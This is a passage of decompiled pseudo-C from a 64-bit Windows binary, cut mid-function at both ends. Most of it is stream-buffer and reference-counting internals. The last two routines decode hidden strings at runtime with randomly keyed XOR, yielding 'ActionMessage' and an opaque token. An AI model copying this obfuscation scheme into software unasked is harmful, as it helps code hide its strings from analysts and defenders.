  else
  {
    v17 = *(_QWORD **)(v4 + 32);
    *(_QWORD *)(v4 + 104) = v14;
    *v17 = v14;
    **(_QWORD **)(v4 + 64) = v14;
    **(_DWORD **)(v4 + 88) = v13;
    v18 = (*(_BYTE *)(v4 + 112) & 4) == 0;
    **(_QWORD **)(v4 + 24) = v14;
    v19 = *(_QWORD **)(v4 + 56);
    if ( v18 )
    {
      *v19 = v14;
      **(_DWORD **)(v4 + 80) = 1;
    }
    else
    {
      *v19 = 0i64;
      **(_DWORD **)(v4 + 80) = (_DWORD)v14;
    }
  }
  if ( *(_BYTE *)(v4 + 112) & 1 )
    operator delete(v16);
  *(_DWORD *)(v4 + 112) |= 1u;
  *(_BYTE *)std::basic_streambuf<char,std::char_traits<char>>::_Pninc(v4) = v3;
  return v3;
}
// 1400A15F0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Pninc(_QWORD);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140029BF0) ----------------------------------------------------
signed __int64 __fastcall sub_140029BF0(__int64 a1, unsigned int a2)
{
  unsigned __int64 v2; // r8
  signed __int64 result; // rax

  v2 = **(_QWORD **)(a1 + 56);
  if ( !v2 || v2 <= **(_QWORD **)(a1 + 24) || a2 != -1 && (_BYTE)a2 != *(_BYTE *)(v2 - 1) && *(_BYTE *)(a1 + 112) & 2 )
    return 0xFFFFFFFFi64;
  ++**(_DWORD **)(a1 + 80);
  --**(_QWORD **)(a1 + 56);
  if ( a2 == -1 )
    return 0i64;
  result = a2;
  ***(_BYTE ***)(a1 + 56) = a2;
  return result;
}

//----- (0000000140029C40) ----------------------------------------------------
__int64 __fastcall sub_140029C40(__int64 a1, __int64 a2, __int64 a3, int a4, char a5)
{
  unsigned __int64 *v5; // rdi
  __int64 v6; // r11
  __int64 v7; // r10
  unsigned __int64 v8; // rax
  _DWORD *v9; // rsi
  __int64 *v10; // rdx
  _DWORD *v11; // rcx
  int v12; // edx
  _QWORD *v13; // r9
  int v14; // edx
  __int64 v15; // rcx
  _DWORD *v16; // rcx
  int v17; // edx

  v5 = *(unsigned __int64 **)(a1 + 64);
  v6 = a2;
  v7 = a1;
  v8 = *v5;
  if ( *v5 && *(_QWORD *)(a1 + 104) < v8 )
    *(_QWORD *)(a1 + 104) = v8;
  if ( a5 & 1 )
  {
    v9 = *(_DWORD **)(a1 + 56);
    if ( *(_QWORD *)v9 )
    {
      v10 = (__int64 *)std::_BADOFF;
      switch ( a4 )
      {
        case 2:
          a3 += *(_QWORD *)(a1 + 104) - **(_QWORD **)(a1 + 24);
LABEL_13:
          if ( a3 >= 0 )
          {
            v11 = *(_DWORD **)(a1 + 24);
            if ( a3 <= *(_QWORD *)(v7 + 104) - *(_QWORD *)v11 )
            {
              v12 = a3 + *v11 - *v9;
              **(_DWORD **)(v7 + 80) -= v12;
              **(_QWORD **)(v7 + 56) += v12;
              if ( a5 & 2 )
              {
                v13 = *(_QWORD **)(v7 + 64);
                if ( *v13 )
                {
                  v14 = *v13 + **(_DWORD **)(v7 + 88);
                  v15 = **(_QWORD **)(v7 + 56);
                  *v13 = v15;
                  **(_DWORD **)(v7 + 88) = v14 - v15;
                }
              }
              goto LABEL_32;
            }
          }
LABEL_29:
          a3 = *v10;
          goto LABEL_32;
        case 1:
          if ( !(a5 & 2) )
          {
            a3 += *(_QWORD *)v9 - **(_QWORD **)(a1 + 24);
            goto LABEL_13;
          }
          break;
        case 0:
          goto LABEL_13;
      }
      a3 = std::_BADOFF;
      goto LABEL_13;
    }
  }
  if ( a5 & 2 && *v5 )
  {
    v10 = (__int64 *)std::_BADOFF;
    if ( a4 == 2 )
    {
      a3 += *(_QWORD *)(a1 + 104) - **(_QWORD **)(a1 + 24);
    }
    else if ( a4 == 1 )
    {
      a3 += *v5 - **(_QWORD **)(a1 + 24);
    }
    else if ( a4 )
    {
      a3 = std::_BADOFF;
    }
    if ( a3 >= 0 )
    {
      v16 = *(_DWORD **)(a1 + 24);
      if ( a3 <= *(_QWORD *)(v7 + 104) - *(_QWORD *)v16 )
      {
        v17 = a3 + *v16 - *(_DWORD *)v5;
        **(_DWORD **)(v7 + 88) -= v17;
        **(_QWORD **)(v7 + 64) += v17;
        goto LABEL_32;
      }
    }
    goto LABEL_29;
  }
  if ( a3 )
    a3 = std::_BADOFF;
LABEL_32:
  *(_QWORD *)(v6 + 8) = 0i64;
  *(_DWORD *)(v6 + 16) = 0;
  *(_QWORD *)v6 = a3;
  return v6;
}
// 1400A1650: using guessed type const __int64 std::_BADOFF;

//----- (0000000140029DD0) ----------------------------------------------------
__int64 __fastcall sub_140029DD0(__int64 a1, __int64 a2, _QWORD *a3, char a4)
{
  __int64 v4; // rbx
  __int64 v5; // r11
  __int64 v6; // r10
  unsigned __int64 *v7; // r8
  unsigned __int64 v8; // rax
  _DWORD *v9; // rdi
  _DWORD *v10; // rdx
  int v11; // edx
  __int64 *v12; // r8
  __int64 v13; // rcx
  int v14; // edx
  __int64 v15; // rcx
  _DWORD *v16; // rdx
  int v17; // edx

  v4 = a2;
  v5 = a1;
  v6 = *a3 + a3[1];
  v7 = *(unsigned __int64 **)(a1 + 64);
  v8 = *v7;
  if ( *v7 && *(_QWORD *)(a1 + 104) < v8 )
    *(_QWORD *)(a1 + 104) = v8;
  if ( v6 != std::_BADOFF )
  {
    if ( a4 & 1 && (v9 = *(_DWORD **)(a1 + 56), *(_QWORD *)v9) )
    {
      if ( v6 >= 0 )
      {
        v10 = *(_DWORD **)(a1 + 24);
        if ( v6 <= *(_QWORD *)(a1 + 104) - *(_QWORD *)v10 )
        {
          v11 = v6 + *v10 - *v9;
          **(_DWORD **)(a1 + 80) -= v11;
          **(_QWORD **)(a1 + 56) += v11;
          if ( a4 & 2 )
          {
            v12 = *(__int64 **)(a1 + 64);
            v13 = *v12;
            if ( *v12 )
            {
              v14 = v13 + **(_DWORD **)(v5 + 88);
              v15 = **(_QWORD **)(v5 + 56);
              *v12 = v15;
              **(_DWORD **)(v5 + 88) = v14 - v15;
            }
          }
          goto LABEL_18;
        }
      }
    }
    else if ( a4 & 2 )
    {
      if ( *v7 )
      {
        if ( v6 >= 0 )
        {
          v16 = *(_DWORD **)(a1 + 24);
          if ( v6 <= *(_QWORD *)(a1 + 104) - *(_QWORD *)v16 )
          {
            v17 = v6 + *v16 - *(_DWORD *)v7;
            **(_DWORD **)(a1 + 88) -= v17;
            **(_QWORD **)(a1 + 64) += v17;
            goto LABEL_18;
          }
        }
      }
    }
    v6 = std::_BADOFF;
  }
LABEL_18:
  *(_QWORD *)v4 = v6;
  *(_QWORD *)(v4 + 8) = 0i64;
  *(_DWORD *)(v4 + 16) = 0;
  return v4;
}
// 1400A1650: using guessed type const __int64 std::_BADOFF;

//----- (0000000140029EE0) ----------------------------------------------------
_QWORD *__fastcall sub_140029EE0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  int v3; // edx
  unsigned __int64 v4; // r9
  unsigned __int64 v5; // r8
  void *v6; // rdx
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // r8
  void *v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rax
  __int64 Src; // [rsp+28h] [rbp-28h]
  __int64 v17; // [rsp+38h] [rbp-18h]
  unsigned __int64 v18; // [rsp+40h] [rbp-10h]

  v2 = a2;
  v3 = *(_DWORD *)(a1 + 112);
  if ( !(v3 & 2) )
  {
    v4 = **(_QWORD **)(a1 + 64);
    if ( v4 )
    {
      v5 = *(_QWORD *)(a1 + 104);
      v6 = **(void ***)(a1 + 32);
      v18 = 15i64;
      if ( v5 < v4 )
        v5 = v4;
      v17 = 0i64;
      LOBYTE(Src) = 0;
      sub_140004F20(&Src, v6, v5 - (_QWORD)v6);
      v2[3] = 15i64;
      v2[2] = 0i64;
      *(_BYTE *)v2 = 0;
      v7 = v18;
      if ( v18 >= 0x10 )
      {
        *v2 = Src;
      }
      else if ( v17 != -1 )
      {
        memmove(v2, &Src, v17 + 1);
        v8 = v18;
        v2[2] = v17;
        v2[3] = v8;
        return v2;
      }
      v9 = v17;
      v2[3] = v7;
      v2[2] = v9;
      return v2;
    }
  }
  if ( v3 & 4 || (v10 = **(_QWORD **)(a1 + 56)) == 0 )
  {
    v18 = 15i64;
    v17 = 0i64;
    LOBYTE(Src) = 0;
  }
  else
  {
    v11 = v10 + **(signed int **)(a1 + 80);
    v12 = **(void ***)(a1 + 24);
    v18 = 15i64;
    v17 = 0i64;
    LOBYTE(Src) = 0;
    sub_140004F20(&Src, v12, v11 - (_QWORD)v12);
  }
  v2[3] = 15i64;
  v2[2] = 0i64;
  *(_BYTE *)v2 = 0;
  v13 = v18;
  if ( v18 >= 0x10 )
  {
    *v2 = Src;
  }
  else if ( v17 != -1 )
  {
    memmove(v2, &Src, v17 + 1);
    v13 = v18;
  }
  v14 = v17;
  v2[3] = v13;
  v2[2] = v14;
  return v2;
}

//----- (000000014002A070) ----------------------------------------------------
_QWORD *__fastcall sub_14002A070(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_140029EE0(a1 + 24, a2);
  return v2;
}

//----- (000000014002A0A0) ----------------------------------------------------
signed __int64 __fastcall sub_14002A0A0(__int64 a1)
{
  unsigned __int8 **v1; // r9
  unsigned __int8 *v2; // rdx
  signed int *v3; // r10
  unsigned __int64 v5; // r8

  v1 = *(unsigned __int8 ***)(a1 + 56);
  v2 = *v1;
  if ( !*v1 )
    return 0xFFFFFFFFi64;
  v3 = *(signed int **)(a1 + 80);
  if ( v2 < &v2[*v3] )
    return *v2;
  if ( *(_BYTE *)(a1 + 112) & 4 )
    return 0xFFFFFFFFi64;
  v5 = **(_QWORD **)(a1 + 64);
  if ( !v5 || v5 <= (unsigned __int64)v2 && *(_QWORD *)(a1 + 104) <= (unsigned __int64)v2 )
    return 0xFFFFFFFFi64;
  if ( *(_QWORD *)(a1 + 104) < v5 )
    *(_QWORD *)(a1 + 104) = v5;
  *v3 = *(unsigned __int64 *)(a1 + 104) - *(_DWORD *)v1;
  return ***(unsigned __int8 ***)(a1 + 56);
}

//----- (000000014002A100) ----------------------------------------------------
_QWORD *__fastcall sub_14002A100(__int64 a1)
{
  _QWORD *result; // rax

  result = (_QWORD *)(a1 + 32);
  if ( *(_QWORD *)(a1 + 56) >= 0x10ui64 )
    result = (_QWORD *)*result;
  return result;
}

//----- (000000014002A110) ----------------------------------------------------
_QWORD *__fastcall sub_14002A110(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  _QWORD *v5; // rcx
  __int64 v6; // rax
  volatile signed __int32 *v7; // rbx

  v3 = a3;
  v4 = a1;
  *a1 = &off_1400A6CD0;
  v5 = a1 + 1;
  v5[3] = 15i64;
  v5[2] = 0i64;
  *(_BYTE *)v5 = 0;
  sub_140004DF0(v5, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v4[5] = *v3;
  v6 = v3[1];
  v4[6] = v6;
  if ( v6 )
    _InterlockedIncrement((volatile signed __int32 *)(v6 + 8));
  v7 = (volatile signed __int32 *)v3[1];
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
      if ( !_InterlockedDecrement(v7 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
    }
  }
  return v4;
}
// 1400A6CD0: using guessed type __int64 (__fastcall *off_1400A6CD0)(void *);

//----- (000000014002A1C0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14002A1C0(__int64 a1))()
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rdi
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  v2 = *(volatile signed __int32 **)(a1 + 48);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  if ( *(_QWORD *)(v1 + 32) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 8));
  *(_QWORD *)(v1 + 32) = 15i64;
  *(_QWORD *)(v1 + 24) = 0i64;
  *(_BYTE *)(v1 + 8) = 0;
  result = &off_1400A56B0;
  *(_QWORD *)v1 = &off_1400A56B0;
  return result;
}
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();

//----- (000000014002A250) ----------------------------------------------------
void *__fastcall sub_14002A250(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14002A1C0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014002A280) ----------------------------------------------------
_QWORD *__fastcall sub_14002A280(__int64 a1)
{
  _QWORD *result; // rax

  result = (_QWORD *)(a1 + 8);
  if ( *(_QWORD *)(a1 + 32) >= 0x10ui64 )
    result = (_QWORD *)*result;
  return result;
}

//----- (000000014002A290) ----------------------------------------------------
char __fastcall sub_14002A290(_QWORD *a1, _BYTE *a2, _BYTE *a3)
{
  _BYTE *v3; // rdi
  _QWORD *v4; // rsi
  size_t v5; // rbx
  size_t v6; // r8
  _BYTE *v7; // rax
  size_t v8; // r8
  __int64 v9; // rbx
  _QWORD *v10; // rax
  _QWORD *v11; // rdx
  char v12; // bl
  void *v14; // [rsp+30h] [rbp-59h]
  __int64 v15; // [rsp+40h] [rbp-49h]
  unsigned __int64 v16; // [rsp+48h] [rbp-41h]
  void *Dst; // [rsp+50h] [rbp-39h]
  __int64 v18; // [rsp+60h] [rbp-29h]
  unsigned __int64 v19; // [rsp+68h] [rbp-21h]
  void *v20; // [rsp+70h] [rbp-19h]
  __int64 v21; // [rsp+80h] [rbp-9h]
  unsigned __int64 v22; // [rsp+88h] [rbp-1h]
  void *v23; // [rsp+90h] [rbp+7h]
  __int64 v24; // [rsp+A0h] [rbp+17h]
  unsigned __int64 v25; // [rsp+A8h] [rbp+1Fh]

  v3 = a3;
  v4 = a1;
  if ( !a2 || !a3 || !a1[5] )
    return 0;
  v16 = 15i64;
  v15 = 0i64;
  LOBYTE(v14) = 0;
  v19 = 15i64;
  v18 = 0i64;
  LOBYTE(Dst) = 0;
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(v20) = 0;
  v5 = -1i64;
  if ( *a2 )
  {
    v6 = -1i64;
    do
      ++v6;
    while ( a2[v6] );
  }
  else
  {
    v6 = 0i64;
  }
  sub_140004F20(&Dst, a2, v6);
  v7 = (_BYTE *)(*(__int64 (__fastcall **)(_QWORD *))(*v4 + 16i64))(v4);
  if ( *v7 )
  {
    v8 = -1i64;
    do
      ++v8;
    while ( v7[v8] );
  }
  else
  {
    v8 = 0i64;
  }
  sub_140004F20(&v14, v7, v8);
  if ( *v3 )
  {
    do
      ++v5;
    while ( v3[v5] );
  }
  else
  {
    v5 = 0i64;
  }
  sub_140004F20(&v20, v3, v5);
  v9 = v4[5];
  v10 = (_QWORD *)sub_14001AE70(&v14, (__int64)&v23);
  v11 = v10;
  if ( v10[3] >= 0x10ui64 )
    v11 = (_QWORD *)*v10;
  v12 = (*(__int64 (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v9 + 32i64))(v9, v11);
  if ( v25 >= 0x10 )
    operator delete(v23);
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(v23) = 0;
  if ( v22 >= 0x10 )
    operator delete(v20);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(v20) = 0;
  if ( v19 >= 0x10 )
    operator delete(Dst);
  v19 = 15i64;
  v18 = 0i64;
  LOBYTE(Dst) = 0;
  if ( v16 >= 0x10 )
    operator delete(v14);
  return v12;
}

//----- (000000014002A450) ----------------------------------------------------
_QWORD *__fastcall sub_14002A450(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A6ED8;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A6ED8: using guessed type __int64 (__fastcall *off_1400A6ED8)();

//----- (000000014002A4C0) ----------------------------------------------------
void __fastcall sub_14002A4C0(void *a1)
{
  volatile signed __int32 **v1; // rbx
  volatile signed __int32 *v2; // rdi
  HANDLE v3; // rax

  if ( a1 )
  {
    v1 = (volatile signed __int32 **)a1;
    sub_1400366B0((volatile signed __int32 **)a1);
    v2 = *v1;
    if ( *v1 )
    {
      if ( !_InterlockedDecrement(v2 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v2)(v2, 0i64);
        v3 = GetProcessHeap();
        HeapFree(v3, 0, (LPVOID)v2);
      }
    }
    operator delete(v1);
  }
}

//----- (000000014002A530) ----------------------------------------------------
char *__fastcall sub_14002A530(__int64 a1)
{
  __int64 v1; // rdi
  HANDLE v2; // rax
  const char *v3; // rax
  char *v4; // rbx
  void *v6; // [rsp+28h] [rbp-20h]
  const char *v7; // [rsp+58h] [rbp+10h]
  const char *v8; // [rsp+60h] [rbp+18h]
  const char *v9; // [rsp+68h] [rbp+20h]

  v1 = a1;
  v2 = GetProcessHeap();
  v3 = (const char *)HeapAlloc(v2, 0, 0x90ui64);
  v4 = (char *)v3;
  v7 = v3;
  if ( !v3 )
  {
    v7 = "bad allocation";
    std::exception::exception((std::exception *)&v6, &v7, 1);
    v6 = &loc_1400A3C88;
    sub_140017340(&v6);
  }
  v8 = v3;
  v9 = v3;
  sub_1400186C0((__int64)v3);
  *(_QWORD *)v4 = &off_1400A6EC0;
  *(_OWORD *)(v4 + 120) = *(_OWORD *)v1;
  *((_QWORD *)v4 + 17) = *(_QWORD *)(v1 + 16);
  return v4;
}
// 140017340: using guessed type __int64 __fastcall sub_140017340(_QWORD);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400A6EC0: using guessed type __int64 (__fastcall *off_1400A6EC0)(void *);

//----- (000000014002A5F0) ----------------------------------------------------
char **__fastcall sub_14002A5F0(char **a1, __int64 a2)
{
  char **v2; // rbx
  char *v3; // rax

  v2 = a1;
  v3 = sub_14002A530(a2);
  *v2 = v3;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)v3 + 2);
  return v2;
}

//----- (000000014002A620) ----------------------------------------------------
__int64 __fastcall sub_14002A620(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_14002A450(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (000000014002A700) ----------------------------------------------------
_QWORD *__fastcall sub_14002A700(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // rax

  *a1 = &off_1400A6E78;
  a1[1] = *a2;
  v2 = a2[1];
  a1[2] = v2;
  if ( v2 )
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
  a1[3] = 0i64;
  a1[4] = 0i64;
  a1[5] = 0i64;
  return a1;
}
// 1400A6E78: using guessed type __int64 (__fastcall *off_1400A6E78)(void *);

//----- (000000014002A740) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14002A740(_QWORD *a1))()
{
  _QWORD *v1; // rsi
  __int64 *v2; // rcx
  volatile signed __int32 *v3; // rbx
  volatile signed __int32 *v4; // rbx
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  *a1 = &off_1400A6E78;
  v2 = (__int64 *)a1[4];
  if ( v2 )
    sub_14002B490(v2, 10000i64);
  v3 = (volatile signed __int32 *)v1[5];
  if ( v3 )
  {
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 16i64))(v3);
    }
  }
  v4 = (volatile signed __int32 *)v1[2];
  if ( v4 )
  {
    if ( !_InterlockedDecrement(v4 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  result = &off_1400A56B0;
  *v1 = &off_1400A56B0;
  return result;
}
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();
// 1400A6E78: using guessed type __int64 (__fastcall *off_1400A6E78)(void *);

//----- (000000014002A7E8) ----------------------------------------------------
__int64 __fastcall sub_14002A7E8(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 64i64))();
}

//----- (000000014002A7F0) ----------------------------------------------------
void *__fastcall sub_14002A7F0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14002A740(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014002A820) ----------------------------------------------------
void __fastcall sub_14002A820(__int64 a1)
{
  JUMPOUT(*(_QWORD *)(a1 + 32), 0i64, sub_14001D1F0);
}

//----- (000000014002A830) ----------------------------------------------------
_BOOL8 __fastcall sub_14002A830(__int64 a1, unsigned int a2)
{
  _QWORD *v2; // rax
  bool v3; // bl
  __int64 v5; // [rsp+20h] [rbp-68h]
  __int64 v6; // [rsp+28h] [rbp-60h]
  void *Src; // [rsp+30h] [rbp-58h]
  __int64 v8; // [rsp+40h] [rbp-48h]
  unsigned __int64 v9; // [rsp+48h] [rbp-40h]
  CHAR Name; // [rsp+50h] [rbp-38h]

  v6 = -2i64;
  if ( (signed __int64)a2 >= 1 )
  {
    v5 = 1000000000i64 * a2 + *sub_140034EC0(&v5);
    sub_140016E80(&v5);
  }
  v2 = sub_14002AB10(&Src);
  sub_14000DBF0((__int64)&Name, v2);
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3 = sub_14000DDF0(&Name);
  sub_14000DD60((__int64)&Name);
  return v3;
}
// 140016E80: using guessed type __int64 __fastcall sub_140016E80(_QWORD);

//----- (000000014002A900) ----------------------------------------------------
_QWORD *__fastcall sub_14002A900(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA43C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA43C & 1 )
  {
    v5 = byte_1400DA438;
  }
  else
  {
    v4 = 69069 * dword_1400DA42C + 1234567;
    v1 = dword_1400DA43C | 1;
    dword_1400DA42C = v4;
    dword_1400DA43C |= 1u;
    dword_1400DA424 = HIWORD(dword_1400DA424) + 36969 * (unsigned __int16)dword_1400DA424;
    LOBYTE(v4) = (BYTE2(dword_1400DA434) + 80 * dword_1400DA434) ^ v4;
    dword_1400DA434 = HIWORD(dword_1400DA434) + 18000 * (unsigned __int16)dword_1400DA434;
    v5 = (((unsigned int)dword_1400DA428 >> 13) ^ 32 * dword_1400DA428 ^ dword_1400DA428) + v4;
    dword_1400DA428 ^= ((unsigned int)dword_1400DA428 >> 13) ^ 32 * (dword_1400DA428 ^ (dword_1400DA428 << 12));
    byte_1400DA438 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA43C = v1 | 2;
    byte_1400DA440[0] = v5 ^ 0x41;
    byte_1400DA441 = (v5 - 1) ^ 0x63;
    byte_1400DA442 = (v5 - 2) ^ 0x74;
    byte_1400DA443 = (v5 - 3) ^ 0x69;
    byte_1400DA444 = (v5 - 4) ^ 0x6F;
    byte_1400DA445 = (v5 - 5) ^ 0x6E;
    byte_1400DA446 = (v5 - 6) ^ 0x4D;
    byte_1400DA447 = (v5 - 7) ^ 0x65;
    byte_1400DA448 = (v5 - 8) ^ 0x73;
    byte_1400DA449 = (v5 - 9) ^ 0x73;
    byte_1400DA44A = (v5 - 10) ^ 0x61;
    byte_1400DA44B = (v5 - 11) ^ 0x67;
    byte_1400DA44C = (v5 - 12) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400DA438;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA440[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400DA424: using guessed type int dword_1400DA424;
// 1400DA428: using guessed type int dword_1400DA428;
// 1400DA42C: using guessed type int dword_1400DA42C;
// 1400DA434: using guessed type int dword_1400DA434;
// 1400DA438: using guessed type char byte_1400DA438;
// 1400DA43C: using guessed type int dword_1400DA43C;
// 1400DA441: using guessed type char byte_1400DA441;
// 1400DA442: using guessed type char byte_1400DA442;
// 1400DA443: using guessed type char byte_1400DA443;
// 1400DA444: using guessed type char byte_1400DA444;
// 1400DA445: using guessed type char byte_1400DA445;
// 1400DA446: using guessed type char byte_1400DA446;
// 1400DA447: using guessed type char byte_1400DA447;
// 1400DA448: using guessed type char byte_1400DA448;
// 1400DA449: using guessed type char byte_1400DA449;
// 1400DA44A: using guessed type char byte_1400DA44A;
// 1400DA44B: using guessed type char byte_1400DA44B;
// 1400DA44C: using guessed type char byte_1400DA44C;

//----- (000000014002AB10) ----------------------------------------------------
_QWORD *__fastcall sub_14002AB10(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA460;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA460 & 1 )
  {
    v5 = byte_1400DA45D;
  }
  else
  {
    v4 = 69069 * dword_1400DA42C + 1234567;
    v1 = dword_1400DA460 | 1;
    dword_1400DA42C = v4;
    dword_1400DA460 |= 1u;
    dword_1400DA424 = HIWORD(dword_1400DA424) + 36969 * (unsigned __int16)dword_1400DA424;
    LOBYTE(v4) = (BYTE2(dword_1400DA434) + 80 * dword_1400DA434) ^ v4;
    dword_1400DA434 = HIWORD(dword_1400DA434) + 18000 * (unsigned __int16)dword_1400DA434;
    v5 = (((unsigned int)dword_1400DA428 >> 13) ^ 32 * dword_1400DA428 ^ dword_1400DA428) + v4;
    dword_1400DA428 ^= ((unsigned int)dword_1400DA428 >> 13) ^ 32 * (dword_1400DA428 ^ (dword_1400DA428 << 12));
    byte_1400DA45D = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA460 = v1 | 2;
    byte_1400DA468[0] = v5 ^ 0x76;
    byte_1400DA469 = (v5 - 1) ^ 0x74;
    byte_1400DA46A = (v5 - 2) ^ 0x78;
    byte_1400DA46B = (v5 - 3) ^ 0x6F;
    byte_1400DA46C = (v5 - 4) ^ 0x4B;
    byte_1400DA46D = (v5 - 5) ^ 0x6E;
    byte_1400DA46E = (v5 - 6) ^ 0x50;
    byte_1400DA46F = (v5 - 7) ^ 0x67;
    byte_1400DA470 = (v5 - 8) ^ 0x51;
    byte_1400DA471 = (v5 - 9) ^ 0x5A;
    byte_1400DA472 = (v5 - 10) ^ 0x31;
    byte_1400DA473 = (v5 - 11) ^ 0x4E;
